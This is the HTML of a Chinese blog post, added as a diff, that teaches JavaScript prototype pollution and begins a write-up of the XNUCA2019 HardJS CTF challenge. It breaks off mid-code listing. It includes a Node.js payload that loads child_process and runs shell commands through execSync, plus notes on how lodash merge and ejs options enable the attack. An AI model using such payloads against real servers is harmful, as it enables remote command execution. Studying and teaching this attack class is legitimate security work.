@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
+
+<link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/black/pace-theme-corner-indicator.css">
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"nuxm.gitee.io","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.10.0","exturl":true,"sidebar":{"position":"right","display":"hide","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":true,"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>
+
+  <meta name="description" content="前言需要一定的js基础">
+<meta property="og:type" content="website">
+<meta property="og:title" content="原型链污染">
+<meta property="og:url" content="https://nuxm.gitee.io/SQLInject/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
+<meta property="og:site_name" content="This —&gt; 昊">
+<meta property="og:description" content="前言需要一定的js基础">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/03/15/ZHNuSfXCDk4OEab.jpg">
+<meta property="og:image" content="https://s2.loli.net/2022/03/15/YAlLm68IaD2PVHR.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/15/rv6q7AOwld9DJYV.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/15/L1e3BF6JDiXakdT.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/15/TVdf34HI1QRkGYo.png">
+<meta property="article:published_time" content="2022-03-15T05:04:56.579Z">
+<meta property="article:modified_time" content="2022-03-15T05:05:13.230Z">
+<meta property="article:author" content="昊">
+<meta property="article:tag" content="SQLInject">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/03/15/ZHNuSfXCDk4OEab.jpg">
+
+
+<link rel="canonical" href="https://nuxm.gitee.io/SQLInject/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://nuxm.gitee.io/SQLInject/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","path":"SQLInject/原型链污染/","title":"原型链污染"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>原型链污染 | This —> 昊</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">This —> 昊</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">不过是些许风雪罢了</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#prototype%E5%92%8C-proto"><span class="nav-number">2.</span> <span class="nav-text">prototype和__proto__</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%BB%A7%E6%89%BF"><span class="nav-number">3.</span> <span class="nav-text">JavaScript原型链继承</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="nav-number">4.</span> <span class="nav-text">原型链污染</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XNUCA2019Qualifier-HardJS"><span class="nav-number">5.</span> <span class="nav-text">[XNUCA2019Qualifier]HardJS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="nav-number">5.1.</span> <span class="nav-text">解法一</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ejs%E8%BF%9B%E8%A1%8Crce"><span class="nav-number">5.1.1.</span> <span class="nav-text">利用ejs进行rce</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="昊"
+      src="/images/2222.png">
+  <p class="site-author-name" itemprop="name">昊</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://nuxm.gitee.io/SQLInject/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/2222.png">
+      <meta itemprop="name" content="昊">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="This —> 昊">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          原型链污染
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-03-15 13:04:56 / 修改时间：13:05:13" itemprop="dateCreated datePublished" datetime="2022-03-15T13:04:56+08:00">2022-03-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>需要一定的js基础</p>
+<p><a href="https://sm.ms/image/ZHNuSfXCDk4OEab" target="_blank"><img src="https://s2.loli.net/2022/03/15/ZHNuSfXCDk4OEab.jpg" ></a></p>
+<span id="more"></span>
+
+<h1 id="prototype和-proto"><a href="#prototype和-proto" class="headerlink" title="prototype和__proto__"></a><code>prototype</code>和<code>__proto__</code></h1><p>又称<code>原型链污染</code>。</p>
+<p>在JS语言中，函数即对象，如果要定义一个类，需要以<code>定义</code> 构造函数的方式来定义</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br></pre></td></tr></table></figure>
+
+
+<p><strong>即是函数既可以作为对象去解释又可以作为函数去解释</strong></p>
+<p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个寻找到具体方法或者属性的机制。</p>
+<p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>
+
+
+<p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p>
+<p>如果希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>
+
+
+<p>所以可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p>
+<p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p>
+<p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p>
+<p><code>foo.``**proto**`` == Foo.prototype</code></p>
+<p><a href="https://sm.ms/image/YAlLm68IaD2PVHR" target="_blank"><img src="https://s2.loli.net/2022/03/15/YAlLm68IaD2PVHR.png" ></a></p>
+<p>所以，总结一下：</p>
+<ol>
+<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
+<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
+</ol>
+<h1 id="JavaScript原型链继承"><a href="#JavaScript原型链继承" class="headerlink" title="JavaScript原型链继承"></a>JavaScript原型链继承</h1><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>
+<p>比如：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>
+
+
+<p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p>
+<p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p>
+<ol>
+<li>在对象son中寻找last_name</li>
+<li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>
+<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>
+<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
+</ol>
+<p><a href="https://sm.ms/image/rv6q7AOwld9DJYV" target="_blank"><img src="https://s2.loli.net/2022/03/15/rv6q7AOwld9DJYV.png" ></a></p>
+<p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作<code>prototype继承链</code>。</p>
+<p>以上就是最基础的JavaScript面向对象编程，并不深入研究更细节的内容，只要牢记以下几点即可：</p>
+<ol>
+<li>每个构造函数(constructor)都有一个原型对象(prototype)</li>
+<li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li>
+<li>JavaScript使用prototype链实现继承机制</li>
+</ol>
+<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>前面说到，<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>
+
+
+<p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p>
+<p><a href="https://sm.ms/image/L1e3BF6JDiXakdT" target="_blank"><img src="https://s2.loli.net/2022/03/15/L1e3BF6JDiXakdT.png" ></a></p>
+<p>原因也显而易见：因为前面修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p>
+<p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。</p>
+<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
+<p>js中有个json.prase的方法,json解析的时候,会把<code>__proto__</code>变成一个键名，可以理解为和a同级,而不是一个原型的属性了，变成一个普通的属性。</p>
+<p><a href="https://sm.ms/image/TVdf34HI1QRkGYo" target="_blank"><img src="https://s2.loli.net/2022/03/15/TVdf34HI1QRkGYo.png" ></a></p>
+<p>常规Payload</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e =&gt; &#123; <span class="keyword">for</span> (<span class="keyword">var</span> a <span class="keyword">in</span> &#123;&#125;) &#123; <span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[a]; &#125; <span class="keyword">return</span> <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;uname -a&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其他视具体情况改变。</p>
+<p>一般两个函数<code>(merge，和clone)</code>可以形成攻击环境</p>
+<p><code>[a.name](http://a.name)`` = a[&#39;name&#39;]</code></p>
+<h1 id="XNUCA2019Qualifier-HardJS"><a href="#XNUCA2019Qualifier-HardJS" class="headerlink" title="[XNUCA2019Qualifier]HardJS"></a>[XNUCA2019Qualifier]HardJS</h1><p>这题是可以下载源码的。</p>
+<p>查看ejs的源码，看到下面代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">source</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">generateSource</span>();</span><br><span class="line">  prepended += <span class="string">&#x27;  var __output = [], __append = __output.push.bind(__output);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">    prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">_with</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">    prepended +=  <span class="string">&#x27;  with (&#x27;</span> + opts.<span class="property">localsName</span> + <span class="string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    appended += <span class="string">&#x27;  &#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  appended += <span class="string">&#x27;  return __output.join(&quot;&quot;);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">source</span> = prepended + <span class="variable language_">this</span>.<span class="property">source</span> + appended;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p><code>server.js</code>中是服务器的主要逻辑代码，可以看到其使用了<code>ejs</code>作为渲染引擎，并使用了中间件<code>body-parser</code>，通过这一行代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extend</span>: <span class="literal">true</span>&#125;)).<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br></pre></td></tr></table></figure>
+
+
+<p>说明服务器会接收POST传过来的json数据，而且我也知道这道题目的考察点就是原型链污染（因为就是奔着掌握这个知识点来刷题的），那么我们就可以通过这个接口传入参数到服务端了。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/get&quot;</span>,auth,<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userid = req.<span class="property">session</span>.<span class="property">userid</span> ; </span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">&quot;select count(*) count from `html` where userid= ?&quot;</span></span><br><span class="line">    <span class="comment">// var sql = &quot;select `dom` from  `html` where userid=? &quot;;</span></span><br><span class="line">    <span class="keyword">var</span> dataList = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(dataList[<span class="number">0</span>].<span class="property">count</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].<span class="property">count</span> &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Merge the recorder in the database.&quot;</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;select `id`,`dom` from  `html` where userid=? &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="title class_">Array</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.<span class="property">length</span> ;i++)&#123;</span><br><span class="line">            lodash.<span class="title function_">defaultsDeep</span>(doms,<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">&quot;delete from `html` where id = ?&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span 